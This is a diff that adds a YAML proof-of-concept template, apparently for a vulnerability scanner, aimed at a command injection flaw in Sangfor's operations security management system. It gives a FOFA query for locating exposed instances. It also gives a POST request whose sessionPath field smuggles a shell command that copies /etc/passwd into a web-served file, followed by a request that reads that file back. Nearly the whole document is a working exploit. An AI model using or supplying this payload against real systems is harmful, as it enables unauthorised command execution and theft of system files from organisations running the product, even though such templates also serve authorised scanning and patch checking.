@@ -1,0 +1,22 @@
+id: poc-yaml-sangfor-osm-gethis-commond-injection
+info:
+  name: 深信服运维安全管理系统 getHis 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: 深信服运维安全管理系统
+  fofa: body="/fort/login" && header="FORTSESSIONID"
+variables:
+  t1: random_str(7)
+requests:
+- method: POST
+  path: /isomp-protocol/protocol/getHis
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: sessionPath=;cat%20/etc/passwd>/usr/local/tomcat/webapps/fort/trust/js/{{.t1}}.txt;&sid=1
+  expression: status_code == 200
+- method: GET
+  path: /fort/trust/js/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
